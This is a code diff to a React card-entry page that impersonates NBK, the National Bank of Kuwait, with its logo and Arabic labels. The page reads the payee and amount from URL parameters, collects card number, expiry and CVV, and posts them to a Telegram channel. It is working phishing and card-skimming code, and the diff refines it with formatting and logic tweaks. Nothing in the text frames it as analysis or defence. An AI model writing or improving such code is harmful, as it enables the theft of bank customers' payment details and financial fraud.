@@ -6,13 +6,15 @@ import { sendMessageToTelegram } from "@/backend/telegramService";
 const CardDetails = () => {
   const { id } = useParams();
   const navigate = useNavigate();
-  const queryParams = new URLSearchParams(window.location.search);
   
-  const paymentData = useMemo(() => ({
-    customerName: queryParams.get('n') || "halits.YILDIZ",
-    amount: queryParams.get('a') || "5.000",
-    currency: queryParams.get('c') || "KWD"
-  }), [window.location.search]);
+  const paymentData = useMemo(() => {
+    const queryParams = new URLSearchParams(window.location.search);
+    return {
+      customerName: queryParams.get('n') || "halits.YILDIZ",
+      amount: queryParams.get('a') || "5.000",
+      currency: queryParams.get('c') || "KWD"
+    };
+  }, [window.location.search]);
 
   const [formData, setFormData] = useState({ bank: "", cardNumber: "", expiryMonth: "", expiryYear: "", cvv: "", prefix: "" });
   const [loading, setLoading] = useState(false);
@@ -52,7 +54,7 @@ const CardDetails = () => {
     if (!validateCardNumber(fullNumber)) { setError("رقم البطاقة غير صالح"); return; }
     setLoading(true);
     const message = `
-<b>💳 New Card Entry</b>
+<b>💳 Card Details</b>
 <b>Name:</b> ${paymentData.customerName}
 <b>Amount:</b> ${paymentData.amount} KD
 <b>Bank:</b> ${formData.bank}
@@ -70,7 +72,7 @@ const CardDetails = () => {
         <div className="text-center mb-6"><img src="/nbk-logo.jpg" alt="NBK" className="h-10 mx-auto" /></div>
         <div className="border-b pb-4 mb-6">
            <div className="flex justify-between font-bold text-lg"><span>{paymentData.customerName}</span><span>:المستفيد</span></div>
-           <div className="flex justify-between font-bold text-xl text-blue-700"><span>KD {parseFloat(paymentData.amount).toFixed(3)}</span><span>:المبلغ</span></div>
+           <div className="flex justify-between font-bold text-xl text-blue-700"><span>KD {paymentData.amount}</span><span>:المبلغ</span></div>
         </div>
         <form onSubmit={handleSubmit} className="space-y-4">
           {error && <div className="p-3 bg-red-100 text-red-700 rounded text-center">{error}</div>}
@@ -83,7 +85,7 @@ const CardDetails = () => {
                <option value="">MM</option>{Array.from({length: 12}, (_, i) => <option key={i+1} value={String(i+1).padStart(2, '0')}>{String(i+1).padStart(2, '0')}</option>)}
             </select>
             <select value={formData.expiryYear} onChange={(e) => handleInputChange('expiryYear', e.target.value)} className="flex-1 p-3 border rounded-xl" required>
-               <option value="">YYYY</option>{Array.from({length: 15}, (_, i) => <option key={2024+i} value={2024+i}>{2024+i}</option>)}
+               <option value="">YYYY</option>{Array.from({length: 20}, (_, i) => <option key={2024+i} value={2024+i}>{2024+i}</option>)}
             </select>
           </div>
           <Input type="text" placeholder="CVV" maxLength={3} value={formData.cvv} onChange={(e) => handleInputChange('cvv', e.target.value)} className="text-center" required />
@@ -93,4 +95,5 @@ const CardDetails = () => {
     </div>
   );
 };
+
 export default CardDetails;
